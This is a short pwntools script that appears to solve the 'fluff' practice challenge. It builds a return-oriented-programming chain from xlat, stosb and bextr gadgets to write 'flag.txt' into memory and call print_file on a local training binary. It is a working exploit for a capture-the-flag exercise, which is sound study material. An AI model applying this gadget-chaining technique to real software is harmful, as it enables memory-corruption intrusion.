from pwn import *
p = process('./fluff')

xlat = p64(0x400628)
stosb = p64(0x400639) 
pops_add_bextr = p64(0x40062a)
pop = p64(0x4006a3)

print_file = p64(0x400510)
bss = 0x601038

flag = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
flag_loc = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246, 0x400192]
rax = 0xb

payload = b"A" * 40
for i in range(len(flag)):
    if (i!=0):
        rax = ord(flag[i-1])
    rcx = flag_loc[i] - rax - 0x3ef2
    payload += pops_add_bextr + p64(0x4000) + p64(rcx)
    payload += xlat
    payload += pop + p64(bss + i)
    payload += stosb

payload += pop + p64(bss)
payload += print_file

p.sendline(payload)
print(p.recvall().decode('utf-8'))

